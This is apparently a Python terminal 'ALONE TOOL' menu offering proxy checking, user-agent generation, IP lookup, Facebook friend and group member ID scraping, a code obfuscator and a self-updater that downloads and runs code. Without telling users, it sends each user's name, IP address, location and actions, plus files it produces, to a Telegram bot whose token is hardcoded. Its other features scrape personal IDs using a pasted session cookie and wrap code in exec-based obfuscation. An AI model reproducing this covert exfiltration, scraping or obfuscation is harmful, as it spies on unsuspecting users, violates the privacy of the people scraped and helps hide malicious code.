import os
import sys
import time
import random
import requests
import base64
import marshal
import zlib
from datetime import datetime
from bs4 import BeautifulSoup

# --- Configuration ---
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID   = "1241769879"

# --- Colors ---
class Colors:
    HEADER     = "\033[95m"
    BLUE       = "\033[94m"
    CYAN       = "\033[96m"
    GREEN      = "\033[92m"
    YELLOW     = "\033[93m"
    RED        = "\033[91m"
    ENDC       = "\033[0m"
    BOLD       = "\033[1m"
    UNDERLINE  = "\033[4m"

# --- Utility Functions ---

def clear():
    os.system("clear")


def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except:
        pass


def send_telegram_file(path, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, 'rb') as f:
            requests.post(url,
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"document": f}, timeout=5)
    except:
        send_telegram_message(f"[!] Could not send file: {path}")

# --- Login & Logging ---

def get_ip_geo():
    try:
        r = requests.get('http://ipinfo.io/json', timeout=5).json()
        return r.get('ip', 'N/A'), f"{r.get('city')}, {r.get('region')}, {r.get('country')}"
    except:
        return 'N/A', 'N/A'


def login():
    clear()
    print(f"{Colors.HEADER} █████╗ ██╗      ██████╗ ███╗   ██╗███████╗")
    print(f"{Colors.HEADER}██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝")
    print(f"{Colors.HEADER}███████║██║     ██║   ██║██╔██╗ ██║█████╗  ")
    print(f"{Colors.HEADER}██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝  ")
    print(f"{Colors.HEADER}██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗")
    print(f"{Colors.HEADER}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}")
    print(f"\n{Colors.CYAN}           A L O N E   T O O L{Colors.ENDC}\n")

    print(f"{Colors.CYAN}[•] Public login to access the tool{Colors.ENDC}")
    username = input(f"{Colors.BLUE}[•] Enter username: {Colors.ENDC}").strip()
    if not username:
        print(f"{Colors.RED}[!] Username cannot be empty{Colors.ENDC}")
        time.sleep(1)
        return login()

    ip, geo = get_ip_geo()
    ts = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
    send_telegram_message(
        f"[•] Login | User: {username} | IP: {ip} | Geo: {geo} | Time: {ts}"
    )
    print(f"{Colors.GREEN}[✓] Welcome, {username}! Access granted.{Colors.ENDC}")
    time.sleep(1)

# --- Features ---

def proxy_options():
    clear(); print(f"{Colors.GREEN}[•] Proxy Options{Colors.ENDC}")
    print(f"{Colors.YELLOW}[1] Check proxies from file{Colors.ENDC}")
    print(f"{Colors.YELLOW}[2] Check proxies from URL{Colors.ENDC}")
    print(f"{Colors.YELLOW}[3] Generate proxies{Colors.ENDC}")
    choice = input(f"{Colors.CYAN}[?] Choose: {Colors.ENDC}")
    proxies = []
    if choice == '1':
        path = input("[•] File path: ")
        if os.path.isfile(path):
            proxies = open(path).read().splitlines()
    elif choice == '2':
        url = input("[•] URL: ")
        try: proxies = requests.get(url, timeout=5).text.splitlines()
        except: pass
    elif choice == '3':
        src = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http"
        try: proxies = requests.get(src, timeout=5).text.splitlines()
        except: pass
    ok = bad = 0
    for p in proxies:
        try:
            r = requests.get('https://httpbin.org/ip', proxies={'http':p,'https':p}, timeout=3)
            ok += 1 if r.ok else 0
            bad += 0 if r.ok else 1
        except: bad += 1
    print(f"{Colors.GREEN}[OK: {ok}]{Colors.ENDC} {Colors.RED}[BAD: {bad}]{Colors.ENDC}")
    send_telegram_message(f"[•] Proxies checked: OK={ok} BAD={bad}")
    input("Press Enter to return...")


def ua_generator():
    clear(); print(f"{Colors.GREEN}[•] User-Agent Generator{Colors.ENDC}")
    samples = [
        "Mozilla/5.0 (Windows...)",
        "Mozilla/5.0 (Macintosh...)",
        "Mozilla/5.0 (Linux...)",
    ]
    count = int(input("[•] How many? "))
    uas = [random.choice(samples) for _ in range(count)]
    with open('ug.txt','w') as f: f.write('\n'.join(uas))
    print(f"{Colors.GREEN}[✓] Saved {count} UAs to ug.txt{Colors.ENDC}")
    send_telegram_message(f"[•] Generated {count} UAs")
    input("Press Enter to return...")


def send_request():
    clear(); print(f"{Colors.GREEN}[•] Send HTTP Request{Colors.ENDC}")
    url = input("[•] URL: ")
    use_p = input("[•] Use proxy (y/n)? ").lower()=='y'
    use_u = input("[•] Use UA (y/n)? ").lower()=='y'
    headers = {}
    proxies = None
    if use_u and os.path.isfile('ug.txt'):
        headers['User-Agent'] = random.choice(open('ug.txt').read().splitlines())
    if use_p and os.path.isfile('proxy.txt'):
        p = random.choice(open('proxy.txt').read().splitlines())
        proxies={'http':p,'https':p}
    try:
        r = requests.get(url, headers=headers, proxies=proxies, timeout=5)
        status = r.status_code
        print(f"{Colors.GREEN}[✓] Status: {status}{Colors.ENDC}")
        send_telegram_message(f"[•] Requested {url} => {status}")
    except Exception as e:
        print(f"{Colors.RED}[!] {e}{Colors.ENDC}")
    input("Press Enter to return...")


def look_ip():
    clear(); print(f"{Colors.GREEN}[•] Look IP Info{Colors.ENDC}")
    ip = input("[•] IP: ")
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        for k,v in data.items(): print(f"{Colors.BLUE}{k}:{Colors.ENDC} {v}")
        send_telegram_message(f"[•] IP Info {ip}: {data}")
    except:
        print(f"{Colors.RED}[!] Failed{Colors.ENDC}")
    input("Press Enter...")


def fb_ids():
    clear(); print(f"{Colors.GREEN}[•] Facebook IDs Extractor{Colors.ENDC}")
    tgt=input("[•] Profile URL/ID: ")
    seen=set()
    def ext(uid):
        r=requests.get(f"https://mbasic.facebook.com/profile.php?id={uid}&v=friends", headers={'User-Agent':'Mozilla/5.0'})
        bs=BeautifulSoup(r.text,'html.parser')
        for a in bs.find_all('a',href=True):
            m=__import__('re').search(r'id=(\d+)',a['href'])
            if m and m.group(1) not in seen:
                seen.add(m.group(1))
                print(f"{Colors.CYAN}{m.group(1)}|{a.text}{Colors.ENDC}")
                ext(m.group(1))
    ext(tgt)
    with open('ids.txt','w') as f: f.write('\n'.join(seen))
    send_telegram_message(f"[•] Extracted {len(seen)} FB IDs")
    input("Press Enter...")


def group_dump():
    clear(); print(f"{Colors.GREEN}[•] Group Member ID Dumper{Colors.ENDC}")
    url=input("[•] Group URL: ")
    cookie=input("[•] FB Cookie: ")
    import re
    m=re.search(r'groups/(\d+)',url)
    if not m: print(f"{Colors.RED}[!] Invalid URL{Colors.ENDC}");input();return
    gid=m.group(1)
    hdr={'Cookie':cookie,'User-Agent':'Mozilla/5.0'}
    seen=[]
    nxt=f"https://mbasic.facebook.com/groups/{gid}/members"
    while nxt:
        r=requests.get(nxt,headers=hdr)
        bs=BeautifulSoup(r.text,'html.parser')
        for a in bs.find_all('a',href=True):
            m2=__import__('re').search(r'id=(\d+)',a['href'])
            if m2 and m2.group(1) not in seen:
                seen.append(m2.group(1))
                print(f"{Colors.CYAN}{m2.group(1)}|{a.text}{Colors.ENDC}")
        nxt_tag=bs.find('a',string='See More')
        nxt='https://mbasic.facebook.com'+nxt_tag['href'] if nxt_tag else None
    with open('groupids.txt','w') as f: f.write('\n'.join(seen))
    send_telegram_message(f"[•] Dumped {len(seen)} group IDs")
    input("Press Enter...")


def encrypt_code():
    clear(); print(f"{Colors.GREEN}[•] Code Encryptor{Colors.ENDC}")
    fname=input("[•] .py file: ")
    if not os.path.isfile(fname): print(f"{Colors.RED}[!] Not found{Colors.ENDC}");time.sleep(1);return
    code=open(fname).read()
    print("[1]Base64 [2]Marshal [3]Zlib+Base64")
    c=input("Choice: ")
    base=os.path.splitext(os.path.basename(fname))[0]
    out=f"enc_{base}.py"
    if c=='1':
        e=base64.b64encode(code.encode()).decode();payload=f"import base64\nexec(base64.b64decode('{e}').decode())"
    elif c=='2':
        mdata=marshal.dumps(compile(code,'','exec'));payload=f"import marshal\nexec(marshal.loads({repr(mdata)}))"
    elif c=='3':
        z=zlib.compress(code.encode());e=base64.b64encode(z).decode();payload=f"import zlib,base64\nexec(zlib.decompress(base64.b64decode('{e}')).decode())"
    else:print(f"{Colors.RED}[!] Invalid{Colors.ENDC}");return
    open(out,'w').write(payload)
    print(f"{Colors.GREEN}[✓] {out}{Colors.ENDC}")
    try: send_telegram_file(out,f"Encrypted {out}")
    except: send_telegram_message(f"Encrypted {out}")
    input("Enter...")


def update_tool():
    clear();print(f"{Colors.GREEN}[•] Auto-Update{Colors.ENDC}")
    url="https://raw.githubusercontent.com/t9cxy/alone-menu/main/main.py"
    try:
        r=requests.get(url,timeout=10);r.raise_for_status()
        open('main.py','wb').write(r.content)
        os.execvp(sys.executable,[sys.executable,'main.py'])
    except Exception as e:
        print(f"{Colors.RED}[!] Update failed: {e}{Colors.ENDC}")
        send_telegram_message(f"Update error: {e}")
        time.sleep(2)

# --- Main Menu ---
while True:
    clear()
    print(f"{Colors.HEADER} █████╗ ██╗      ██████╗ ███╗   ██╗███████╗{Colors.ENDC}")
    print(f"{Colors.HEADER}██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝{Colors.ENDC}")
    print(f"{Colors.HEADER}███████║██║     ██║   ██║██╔██╗ ██║█████╗  {Colors.ENDC}")
    print(f"{Colors.HEADER}██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝  {Colors.ENDC}")
    print(f"{Colors.HEADER}██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗{Colors.ENDC}")
    print(f"{Colors.HEADER}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}")
    print(f"\n{Colors.CYAN}           A L O N E   T O O L{Colors.ENDC}\n")

    print(f"{Colors.BLUE}[1] Proxy Options{Colors.ENDC}")
    print(f"{Colors.BLUE}[2] User-Agent Generator{Colors.ENDC}")
    print(f"{Colors.BLUE}[3] Send HTTP Request{Colors.ENDC}")
    print(f"{Colors.BLUE}[4] Look IP Info{Colors.ENDC}")
    print(f"{Colors.BLUE}[5] Facebook IDs Extractor{Colors.ENDC}")
    print(f"{Colors.BLUE}[6] Group Member ID Dumper{Colors.ENDC}")
    print(f"{Colors.GREEN}[7] Encrypt Code{Colors.ENDC}")
    print(f"{Colors.CYAN}[8] Auto-Update Tool{Colors.ENDC}")
    print(f"{Colors.RED}[0] Exit{Colors.ENDC}\n")

    opt = input(f"{Colors.YELLOW}[•] Choose: {Colors.ENDC}").strip()
    if   opt == '1': proxy_options()
    elif opt == '2': ua_generator()
    elif opt == '3': send_request()
    elif opt == '4': look_ip()
    elif opt == '5': fb_ids()
    elif opt == '6': group_dump()
    elif opt == '7': encrypt_code()
    elif opt == '8': update_tool()
    elif opt == '0': print(f"{Colors.GREEN}[•] Goodbye!{Colors.ENDC}"); sys.exit()
    else: print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}"); time.sleep(1)

